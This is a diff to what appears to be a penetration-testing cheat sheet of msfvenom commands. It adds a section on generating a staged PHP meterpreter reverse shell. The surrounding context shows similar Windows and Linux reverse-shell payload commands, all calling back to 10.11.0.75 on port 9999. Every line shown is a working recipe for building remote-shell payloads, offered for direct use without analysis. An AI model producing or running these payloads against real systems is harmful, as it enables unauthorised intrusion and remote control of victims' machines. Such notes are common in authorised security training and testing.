@@ -17,6 +17,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.75 LPORT=9999 -f exe > rewin
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.75 LPORT=9999 -f elf > reverse.elf
 ```
 
+## PHP TCP reverse shell (staged) with meterpreter
+
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.75 LPORT=9999 -f raw
+```
+
 ## List payloads with filters
 
 ```
